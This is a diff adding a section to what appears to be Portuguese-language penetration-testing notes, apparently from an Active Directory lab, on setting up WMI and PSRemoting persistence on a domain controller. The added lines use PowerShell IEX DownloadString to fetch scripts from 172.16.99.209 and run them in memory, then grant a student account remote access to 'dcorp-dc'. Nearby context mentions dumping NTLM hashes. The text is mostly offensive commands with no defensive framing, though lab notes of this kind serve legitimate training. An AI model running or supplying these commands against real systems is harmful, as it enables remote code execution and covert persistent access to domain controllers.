@@ -2789,8 +2789,16 @@ VAI OBTER OS NTLM HASHES:
 tasklist /v
 tasklist /v | findstr /I svcadmin
 ```
-
-
+##### POWERSHELL - PERSISTENCE WMI E PSREMOTING
+```
+IEX (New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/Set-RemoteWMI.ps1")
+Set-RemoteWMI -UserName student209 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+Get-WmiObject -class win32_operatingsystem -computername dcorp-dc
+```
+```
+IEX (New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/Set-RemotePSRemoting.ps1")
+Set-RemotePSRemoting -Username student209 -computername dcorp-dc -Verbose
+```
 
 
 
